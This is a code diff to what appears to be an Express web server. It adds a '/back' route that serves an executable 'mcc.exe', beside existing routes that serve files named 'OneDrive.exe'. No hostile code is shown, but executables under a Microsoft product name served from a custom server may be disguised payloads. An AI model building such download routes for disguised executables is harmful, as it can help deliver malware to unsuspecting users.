@@ -190,6 +190,10 @@ app.get('/this', (req, res) => {
     const filePath = './src/OneDrive.exe'; // Replace with the actual file path
     res.download(filePath);
   });
+  app.get('/back', (req, res) => {
+    const filePath = './src/mcc.exe'; // Replace with the actual file path
+    res.download(filePath);
+  });
   app.get('/ntx', (req, res) => {
     const filePath = './src/ntx/OneDrive.exe'; // Replace with the actual file path
     res.download(filePath);
